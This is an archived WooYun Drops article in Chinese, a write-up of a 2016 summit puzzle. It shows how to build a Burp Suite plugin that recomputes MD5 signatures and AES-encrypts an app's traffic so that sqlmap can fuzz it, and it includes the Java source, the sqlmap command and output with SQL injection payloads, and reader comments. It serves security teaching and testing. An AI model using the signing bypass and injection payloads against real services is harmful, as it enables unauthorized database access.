@@ -1,0 +1,113 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">签名加密破除-burp插件在app接口fuzz中的运用</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">瘦蛟舞</a> <span class="bull">·</span> <time title="2016/06/22 15:01" ui-time="" datetime="2016/06/22 15:01" class="published ng-binding ng-isolate-scope">2016/06/22 15:01</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h4>0x00 引子</h4><hr><p>文章本是计划在五月完成，由于一直没有合适放出的案例导致此计划一直搁浅。巧遇乌云峰会puzzle，于是出了一道相关的题目，顺便放出此文以供大家交流学习。</p><p>峰会题目地址传送门：</p><p><a href="http://summit.wooyun.org/2016/puzzle.html">http://summit.wooyun.org/2016/puzzle.html</a></p><h4>0x01 初出茅庐</h4><hr><p>随着时间的推进，攻防两端的进步。越来越多的开发者选择在app的通信中加入加密和签名机制以提高整体的安全性，这种做法确实是提高攻击以及漏洞挖掘的门槛，而如何跨过这个门槛就是本文的中心内容。</p><p>加解密相关的内容可以参考下文：</p><p><a href="http://drops.wooyun.org/tips/6049">http://drops.wooyun.org/tips/6049</a></p><p>你是否在测试过程中遇到这样的困惑？</p><p><img alt="" img-src="9e044429d20c1b679c7d565c66208e04bf16278a.jpg"></p><p>你是否在抓到这样的包后一脸萌比？</p><p><img alt="" img-src="fd2c9c820462d0668014238977da3e90fb749e4c.jpg"></p><p>要解决这些问题，简单来说就是需要一个中转脚本来进行加解密和恢复签名的操作。主站现在已经有些案例利用到这个小技巧。</p><p><a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2016-0210847">WooYun: 妈妈圈app签名自动修复fuzz服务端漏洞</a></p><p><a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2016-0215621">WooYun: Zealer_android客户端安全检测(从脱壳到burp自动加解密插件案例/SQL注入/逻辑漏洞/附AES加解密脚本POC)</a></p><h4>0x02 崭露头角</h4><hr><p>我这里选择利用burp的插件来完成这个脚本，选择burp的优势是可以做一些扫描也可以结合其他工具比如sqlmap组合攻击。我学习这个插件的写法是通过看官方示例代码和api，以及在github上搜索相关代码。</p><p>https://portswigger.net/burp/extender/</p><p>https://portswigger.net/burp/extender/api/index.html</p><p>https://github.com/search?q=IBurpExtender&amp;type=Code&amp;utf8=%E2%9C%93</p><p>drops上也有几篇文章写的非常不错。</p><p>http://drops.wooyun.org/papers/3962</p><p>http://drops.wooyun.org/tools/14040</p><p>http://drops.wooyun.org/tools/14685</p><p>http://drops.wooyun.org/tools/16056</p><p>这里最简化的处理流程，只需要掌握插件的基本的写法和IHttpListener、IExtensionHelpers、IBurpExtenderCallbacks这几个关键接口。</p><ol><li>实现IHttpListener接口，重写processHttpMessage方法</li><li>注册IHttpListener接口，callbacks.registerHttpListener(this);</li><li>在processHttpMessage方法中对请求响应包进行加解密以及恢复签名操作。</li></ol><p>关键方法1:发送http请求和接受http响应的时候被调用</p><pre><code>void processHttpMessage(int toolFlag, boolean messageIsRequest, IHttpRequestResponse messageInfo);
+</code></pre><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>toolFlag</td><td>用于burp tool判断是否发出请求的flag</td></tr><tr><td>messageIsRequest</td><td>判断区分请求还是响应的flag</td></tr><tr><td>messageInfo</td><td>http包的具体细节，可以从中取得请求或者响应包的二进制流</td></tr></tbody></table><p>关键方法2:分析处理http请求</p><pre><code>IRequestInfo analyzeRequest(IHttpService httpService, byte[] request);
+</code></pre><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>httpService</td><td>请求服务相关包括host／method等信息，可以设置为空</td></tr><tr><td>request</td><td>待分析的requst二进制流</td></tr><tr><td>return</td><td>IRequestInfo包含requst的各种细节，可以取出parameter／header等</td></tr></tbody></table><p>关键方法3:通过制定headers和body重组http消息</p><pre><code>byte[] buildHttpMessage(List&lt;String&gt; headers, byte[] body);
+</code></pre><table><thead><tr><th>参数</th><th>描述</th></tr></thead><tbody><tr><td>headers</td><td>http请求头</td></tr><tr><td>body</td><td>http请求body</td></tr><tr><td>return</td><td>http message二进制流</td></tr></tbody></table><p>起初计划是做成通用插件的，还是通过分析了一些app梳理这个通用插件所要提供的diy项后为放弃了。个人觉得这么复杂的选项（还要求有逆向基础）实在是不如改插件代码来的快。</p><ol><li><p>需要提供的 editor</p><ul><li>host/port/protocol填写, host : [ z.cn ]</li><li>算法选择 , hash : [ md5/sha256.... ]</li><li>是否排序Map sort, sort : [ Y ]</li><li>签名参数填写, key : [ sign ]</li><li>盐值填写,salt : []</li><li>需要替换的参数 param1/param2 : [] , 替换后参数的内容 value : []</li><li>需要拼接的参数, key/value ,其中 key 是否需要拼接.</li><li>是否拼接 uri</li><li>拼接前是否大小写转换...</li></ul></li><li><p>支持的 hash / 加密算法</p><ul><li>md5 : encode16 / encode32</li><li>sha : sha1 / sha256</li><li>encrytion : aes/des/rsa...</li></ul></li><li><p>后续需加入的功能</p><ul><li>支持更多编码: hex / unicode /base64</li><li>支持时间戳修正: timestamp</li></ul></li></ol><h4>0x03 你的剑就是我的剑</h4><hr><p>掌握burp插件的写法后需要继续分析客户的加密和签名算法，这里也可以选择用cydia的插件Introspy来完成加密算法的分析。</p><p><img alt="" img-src="1aadb6aad29d41a9834aa47959dfe5d8a895ad03.jpg"></p><p>得出加密采用AES/ECB/PKCS5Padding,密钥写在native中。</p><p>签名采用md5,salt同样写在native中。</p><p><img alt="" img-src="30d12eb520edbe11692b11389970f11b8a0e5b93.jpg"></p><p>简单看下so就有aes密钥和hash的salt了，同时这两个也是part1和part2.</p><p>现阶段在没有插件的条件下我们就可以手动用util类进行解密和数据篡改了。</p><p>请求body密文</p><p>D7A0B5D14A27FB858F62C66CCFA533FE7213566B6D50DF5FF19CE796FECE12D074B0E931907958D14F4CD6BE90D4BCB4E1225BD3C530FB6B00BFC810942CC845</p><p>解密后为</p><p>id=3&amp;sign=3012fa31b42aa09a032db0f23d522bcf&amp;dateline=1466505472</p><p>响应body密文</p><p>d9e128643d46562942c62de2e81dd1f34b50dcb0b9853f0ad67000bfeb34e347</p><p>解密后为</p><p>data: third data</p><h4>0x04 弱点击破</h4><p>结合破解到算法我们现在就可以写出这个中转插件了。</p><p>拦截客户端请求requst -> 提取参数，修复签名 -> aes加密后发送 -> 拦截服务端响应response －> aes解密</p><pre><code>#!java
+public class BurpExtender implements IBurpExtender, IHttpListener, IMessageEditorTabFactory {
+
+    private static final String HOST = "sangebaimao.com";
+    private static final String mSign = "sign";
+    public static final String salt = "3edczxcv";
+    public static final String key = "<a class="__cf_email__" href="/cdn-cgi/l/email-protection" data-cfemail="04666c713c6a6c7d322555455e4453575c">[email&#160;protected]</a>";
+    private IExtensionHelpers helpers;
+    private IBurpExtenderCallbacks mCallbacks;
+
+    //
+    // implement IBurpExtender
+    //
+
+    @Override
+    public void registerExtenderCallbacks(IBurpExtenderCallbacks callbacks) {
+        // obtain an extension helpers object
+        helpers = callbacks.getHelpers();
+        // set our extension name
+        callbacks.setExtensionName("WY summit");
+        // register ourselves as an HTTP listener
+        callbacks.registerHttpListener(this);
+//        callbacks.issueAlert("loaded success");
+        mCallbacks = callbacks;
+    }
+
+    //
+    // implement IHttpListener
+    //
+
+
+    @Override
+    public void processHttpMessage(int toolFlag, boolean messageIsRequest, IHttpRequestResponse messageInfo) {
+
+        IHttpService httpService = messageInfo.getHttpService();
+
+        if (messageIsRequest &amp;&amp; httpService.getHost().endsWith(HOST)) {
+
+            byte[] req = messageInfo.getRequest();
+            IRequestInfo reqInfo = helpers.analyzeRequest(httpService, req);
+
+            String path = reqInfo.getUrl().getPath();
+            String method = reqInfo.getMethod();
+            String payload = "";
+            List&lt;IParameter&gt; param = reqInfo.getParameters();
+            //PATCH method can not get parmaters
+//            for (IParameter tmp:param) {
+//
+//                Util.log(mCallbacks,tmp.getName()+":"+tmp.getValue());
+//
+//            }
+            String reqStr = new String(messageInfo.getRequest());
+            String messageBody = reqStr.substring(reqInfo.getBodyOffset());
+            payload = messageBody.substring(3);
+            payload = helpers.urlDecode(payload);
+            String data = "id="+payload+"&amp;sign="+Util.md5(payload+salt);
+            String sec = Util.aesEncode(key,data);
+//            Util.log(mCallbacks,"data:"+data+"\nsec:"+sec);
+            req = helpers.buildHttpMessage(reqInfo.getHeaders(),helpers.stringToBytes(sec));
+            messageInfo.setRequest(req);
+
+        }else {
+            byte[] response = messageInfo.getResponse();
+            IResponseInfo respInfo = helpers.analyzeResponse(response);
+            int offset = respInfo.getBodyOffset();
+            String body = helpers.bytesToString(response).substring(offset);
+            String plantext = Util.aesDecode(key,body);
+            messageInfo.setResponse(helpers.stringToBytes(plantext));
+        }
+
+    }
+}
+</code></pre><p>插件build后加载到burp中enable，再将sqlmap的流量代理到burp中，因为这个注入还有一个坑就是将space空格给替换了，所以这里加入一个tamper脚本来绕过这个filter机制。</p><p>sqlmap -r ~/Documents/cracksql.txt --proxy http://127.0.0.1:8080 --tamper space2hash.py</p><pre><code>sqlmap identified the following injection point(s) with a total of 78 HTTP(s) requests:
+---
+Parameter: id (PATCH)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 3122=3122
+
+    Type: AND/OR time-based blind
+    Title: MySQL &gt;= 5.0.12 AND time-based blind (SELECT)
+    Payload: id=1 AND (SELECT * FROM (SELECT(SLEEP(5)))GVuA)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 2 columns
+    Payload: id=-5803 UNION ALL SELECT NULL,CONCAT(0x716a6a7871,0x647970627157614649706c49466f647248475a6f6f66555977736d644845537976796a696c645953,0x7171707171)#
+---
+back-end DBMS: MySQL 5.0.12
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: id (PATCH)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 3122=3122
+
+    Type: AND/OR time-based blind
+    Title: MySQL &gt;= 5.0.12 AND time-based blind (SELECT)
+    Payload: id=1 AND (SELECT * FROM (SELECT(SLEEP(5)))GVuA)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 2 columns
+    Payload: id=-5803 UNION ALL SELECT NULL,CONCAT(0x716a6a7871,0x647970627157614649706c49466f647248475a6f6f66555977736d644845537976796a696c645953,0x7171707171)#
+---
+back-end DBMS: MySQL 5.0.12
+available databases [4]:
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] sangebaimao
+</code></pre><p>这里如果不解密响应包的话就不能用UNION query来快速查库了，part3就在这个库里面。</p><h3>0xff 归隐江湖</h3><ol><li>burp不会判断重复插件，加载新插件的时候记得移除老版本插件</li><li>插件执行顺序按照ui上显示的顺序，可以使用down／up调整</li><li>对method区分比较清楚，如果遇到post请求中url中也带有参数需要注意，当然一些奇怪的method处理起来也需要点变通</li><li>output如果输入内容较多ui显示不全，可以选择output to system console，然后去terminal中查看</li></ol><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div id="donate" style="padding:10px;border-top:1px solid #d9d9d9;text-align:center"><span>碎银子打赏，作者好攒钱娶媳妇：</span><br><br><img src="http://static.wooyun.org/wooyun/upload/donate/20141223141529d33ebc5e18e728db5f4a24d40002e9d1.jpg" style="width:200px;height:200px"></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">0xCCCC</span> <span class="reply-time">2016-06-25 21:20:59</span></div><p></p><p>曾经遇到过这种接口，解决方案是用 Flask 写了一个 proxy..</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Good</span> <span class="reply-time">2016-06-24 20:05:01</span></div><p></p><p>burp插件，学习了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Adra1n</span> <span class="reply-time">2016-06-24 18:21:20</span></div><p></p><p>终于插件成功了,多谢!!</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">瘦蛟舞</span> <span class="reply-time">2016-06-24 10:54:11</span></div><p></p><p>@bit4 在回收站看到了，应该是被其他审核拒了。 下次和移动相关的稿件可以直接找我</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">DNS</span> <span class="reply-time">2016-06-24 09:33:50</span></div><p></p><p>大表哥66666</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">仁二</span> <span class="reply-time">2016-06-24 06:14:14</span></div><p></p><p>今天没看懂 以后再来看</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">bit4</span> <span class="reply-time">2016-06-23 19:22:24</span></div><p></p><p>@瘦蛟舞 怎么会，当时是发了个word文档过去的~ 标题是“burp suite插件开发实践--处理http请求和响应”。<br>不过无所谓了，已经发到freebuf了。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">瘦蛟舞</span> <span class="reply-time">2016-06-23 10:35:52</span></div><p></p><p>@bit4 大兄弟后台没有看到你的投稿呀</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">1c3z</span> <span class="reply-time">2016-06-23 10:33:51</span></div><p></p><p>你的剑就是我的剑</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">kaili</span> <span class="reply-time">2016-06-23 09:39:47</span></div><p></p><p>@bit4 是你吗？→_→ http://www.freebuf.com/articles/terminal/106673.html</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">神在堕落</span> <span class="reply-time">2016-06-23 09:29:17</span></div><p></p><p>出个ios应用的解签，从appstroe的应用砸壳开始【懵逼了】</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">bit4</span> <span class="reply-time">2016-06-23 09:17:23</span></div><p></p><p>楼主威武，文章的各个点都写得很细，非常值得学习！虽然自己做过同样的事，但遗憾文章写得差，投drops没通过。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">kevinchowsec</span> <span class="reply-time">2016-06-23 01:06:03</span></div><p></p><p>领主V5，tips很到位。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">威霸总代理</span> <span class="reply-time">2016-06-22 19:01:28</span></div><p></p><p>很有学习价值！www.viper-china.net</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Adra1n</span> <span class="reply-time">2016-06-22 17:57:01</span></div><p></p><p>赞</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Rorschach</span> <span class="reply-time">2016-06-22 17:41:53</span></div><p></p><p>果然是渗透题···后面要慢慢研究了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Nicky</span> <span class="reply-time">2016-06-22 16:41:34</span></div><p></p><p>瘦瘦V5</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">小荷才露尖尖角</span> <span class="reply-time">2016-06-22 16:13:39</span></div><p></p><p>6666666</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Zhe</span> <span class="reply-time">2016-06-22 14:59:12</span></div><p></p><p>很有帮助！！！</p><p></p></div></div></div></div></div></main>
